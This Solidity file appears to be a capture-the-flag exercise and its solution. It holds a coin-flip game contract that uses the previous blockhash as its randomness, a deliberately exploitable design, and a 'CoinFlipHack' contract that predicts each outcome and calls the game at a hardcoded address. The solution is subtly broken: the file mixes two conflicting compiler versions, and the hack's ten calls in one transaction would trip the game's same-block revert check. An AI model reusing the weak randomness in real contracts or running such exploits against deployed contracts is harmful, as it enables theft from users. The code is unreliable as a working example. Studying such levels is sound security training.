// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/*
This is a coin flipping game where you need to build up your winning streak 
by guessing the outcome of a coin flip. To complete this level you'll need 
to use your psychic abilities to guess the correct outcome 10 times in a row.

Things that might help:
- See the Help page above, section "Beyond the console"
*/

import './openzeppelin/v3.0.0/contracts/math/SafeMath.sol';

contract CoinFlip {
  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

pragma solidity ^0.8.0;

contract CoinFlipHack {
    CoinFlip public cf = CoinFlip(0xB9DADFc8B6396DbeBFD33642f7300Ecd8C3f7e22);
    uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        for(uint i = 0; i < 10; i++) {
            guess();
        }
    }
    
    function guess() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 outcome = blockValue / factor;
        bool side = outcome == 1 ? true : false;
        cf.flip(side);
    }
}